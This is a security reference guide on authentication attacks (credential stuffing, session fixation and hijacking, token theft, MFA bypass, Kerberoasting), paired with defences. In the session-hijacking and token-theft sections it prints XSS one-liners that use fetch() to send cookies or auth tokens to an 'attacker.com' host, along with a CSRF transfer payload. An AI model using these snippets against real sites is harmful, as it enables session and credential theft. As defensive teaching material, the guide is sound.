# Security — Authentication Attacks: Credential Theft, Session Capture, and Defense Patterns

## Overview

Authentication attacks compromise user identity verification through credential theft, session hijacking, protocol weaknesses, and social engineering. This guide covers attack vectors (credential stuffing, brute force, session fixation/hijacking, token theft, phishing), MFA circumvention, and defense patterns.

## Credential Theft Attacks

### Credential Stuffing

**Attack**: Automated submission of username/password pairs obtained from past data breaches. Users reuse passwords across sites, so credentials stolen from Site A work on Site B.

**Scale**: Billions of compromised credentials available on the dark web. Attack tools (Sentry MBA, OpenBullet) automate testing.

**Indicators**: Spike in login failures from diverse IPs, many failed attempts targeting existing valid usernames, eventual successful logins without MFA.

**Defense patterns**:
- **Rate limiting**: Per-IP (block after N failures in time window), per-account (exponential backoff)
- **CAPTCHA**: After 3-5 failed attempts, challenge with human verification
- **Credential breach detection**: Query HaveIBeenPwned API, check user's password hash against breach lists, force password reset
- **MFA**: Stops 99.9% of automated attacks—attacker has credentials but not the second factor
- **Behavioral analysis**: Detect logins from new geographies, new devices, unusual times

### Brute Force

**Attack**: Systematic password guessing. Variants:
- Dictionary attack: Common words and patterns
- Hybrid: Dictionary + rules (append numbers, special chars)
- Mask attack: Pattern-based (assume password = `capital + lowercase + number + special`)
- Rainbow table: Precomputed hash → plaintext lookup (defeated by salted hashing)

**Timeline**: 8 characters alphanumeric = ~2.8 trillion combinations. At 1,000 guesses/sec = 900+ years. But with weak hashing or short passwords, practical in hours.

**Defense patterns**:
- **Strong password requirements**: Minimum 12-16 characters, mix of case/numbers/symbols, checked against breach lists (Zxcvbn, HaveIBeenPwned)
- **Account lockout**: Temporary (5 min → 15 min → 1 hour escalation). Prevents rapid-fire guessing but can enable DoS on account holders
- **Progressive delays**: Exponential backoff (1 sec, 2 sec, 4 sec, etc.). Slows attackers without hard lockout
- **Hash functions with high cost**: Bcrypt, scrypt, Argon2 are computationally expensive (0.1-1 second per hash). Multiplicatively slows brute force

## Session Attacks

### Session Fixation

**Attack**: Attacker crafts a session ID and tricks victim into using it (e.g., gives victim a link: `login.example.com?sessionid=attacker-knows-this`). Victim logs in with this known session ID. Attacker now has a valid authenticated session.

```
Attacker: Click here: login.example.com?sessionid=ABC123
Victim: Clicks, logs in with sessionid=ABC123
Victim's browser: GET /dashboard, Cookie: sessionid=ABC123
Attacker: Sends same cookie, also gets authenticated access
```

**Defense**: Regenerate session ID immediately after authentication. Old session ID becomes invalid; attacker's copy is worthless.

### Session Hijacking (Sidejacking)

**Attack**: Stealing an active session token via XSS, network sniffing (MITM), malware, or compromised intermediate systems (proxies, ISPs).

**Network-based hijacking**: Plaintext HTTP transmits session cookies over the wire. Attacker on shared WiFi can intercept.

**Browser-based hijacking** (XSS): Malicious script exfiltrates session cookie to attacker's server.

```javascript
// Injected script
fetch('http://attacker.com?cookie=' + document.cookie);
```

**Defense patterns**:
- **HttpOnly flag**: Session cookie cannot be read by JavaScript. Prevents XSS-based exfiltration
- **Secure flag**: Cookie transmitted only over HTTPS. Prevents network interception
- **SameSite=Strict/Lax**: Cookie not sent cross-origin. Prevents CSRF attacks that steal session
- **TLS everywhere**: All traffic encrypted. Network sniffing yields only encrypted bytes
- **Short session lifetime**: Tokens expire after 15-30 minutes. Shortens window for attacker use
- **Token binding**: Session token bound to specific client IP or TLS certificate. Stolen token doesn't work from different networks

### Session Prediction

**Attack**: Attacker guesses valid session IDs by exploiting patterns.

```
Valid sessions: 1000, 1001, 1002, ...  (sequential)
Attacker tries: 1003, 1004, ... and gains access
```

**Defense**: Session IDs must be cryptographically random (128+ bits of entropy). Standard library random number generators are insufficient; use `os.urandom()`, `/dev/urandom`, `crypto.getRandomValues()`.

## Token and MFA Attacks

### Token Theft

**Via XSS**: Malicious script steals bearer tokens or session cookies.

```javascript
// Injected: steal Authorization header
fetch('http://attacker.com?token=' + localStorage.getItem('authToken'));
```

**Via CSRF**: Victim's browser makes requests on victim's behalf. Session cookies auto-attached; CSRF attacker can perform actions but not read responses.

```html
<!-- Embedded in attacker site -->
<img src="https://bank.com/transfer?amount=1000&to=attacker" />
<!-- Victim's browser auto-sends cookies; transfer executes -->
```

**Via supply chain**: Compromised NPM package, GitHub action, or build tool exfiltrates tokens.

**Defense**: HttpOnly + Secure + SameSite cookies, CSRF tokens, Content Security Policy (CSP), token expiration, monitor for suspicious token usage patterns.

### MFA Bypass Techniques

**Phishing**: Attacker tricks user into revealing MFA code (SMS, TOTP).
- User clicks phishing link, enters username/password
- Legitimate service prompts for MFA code
- Phishing page relays code to attacker
- Attacker authenticates to real service with stolen credentials + code

Also called **adversary-in-the-middle (AiTM)** attack.

**Prevention**: Teach users to verify domain names, use passwordless/passkey auth (FIDO2), restrict login locations geographically.

**Backup code theft**: User granted backup codes during MFA setup. If backup codes stored insecurely (photo, email, note), attacker can use them to bypass MFA.

**SIM swapping**: Attacker convinces telecom to port victim's phone number to attacker's SIM. SMS-based MFA codes go to attacker.

**Prevention**: Phone number portability restrictions, identity verification for number transfers, push-based or hardware key MFA (FIDO2 keys) instead of SMS/TOTP.

## Protocol-Level Attacks

### Pass-the-Hash

**Windows/Kerberos context**: Attacker steals the NTLM hash from an authenticated system and uses it to authenticate to other systems without knowing the plaintext password.

**Defense**: Enforce MFA, use Kerberos delegation restrictions, implement network segmentation to limit lateral movement.

### Kerberoasting

**Kerberos attack**: Attacker requests a Kerberos service ticket (TGS) for a service account and offline cracks its password.

1. Attacker requests service ticket for any SPN (service principal name)
2. Kerberos encrypts ticket with service account's password hash
3. Attacker attempts offline brute force on the encrypted ticket
4. If password is weak, attacker cracks it and impersonates the service

**Defense**: Use strong service account passwords, detect suspicious TGS requests, monitor for offline cracking attempts, use managed service accounts (MSA) with automatic password rotation.

## Defense Architecture

### Multi-Factor Authentication (MFA)

Requires multiple proof of identity factors:
- **Something you know**: Password, PIN, security questions
- **Something you have**: Phone (SMS/TOTP), hardware key (FIDO2), smartcard
- **Something you are**: Biometrics (fingerprint, face)

**Trade-offs**: MFA greatly improves security but increases friction. SMS is convenient but susceptible to SIM swapping. Hardware keys (FIDO2) are most secure but require user adoption.

### Passwordless Authentication

Eliminates passwords entirely:
- **FIDO2/WebAuthn**: Hardware key or biometric. Not susceptible to credential stuffing or phishing. Requires user software/hardware support
- **Passkeys**: Cloud-synced cryptographic keys (Apple Keychain, Google Password Manager). Phishing-resistant. Emerging standard
- **Magic links**: One-time token emailed/SMSed to user. Still relies on email/phone security

### Account Recovery

Attackers target account recovery to reset passwords and take over accounts. Safe recovery:
- Use multiple recovery methods (backup email, phone, security key)
- Require verification through secondary channel (email + phone)
- Rate limit recovery attempts
- Alert user of recovery activity
- Invalidate all existing sessions when password reset

See also: security-owasp-auth.md, web-authentication-patterns.md, security-identity.md, security-web-application.md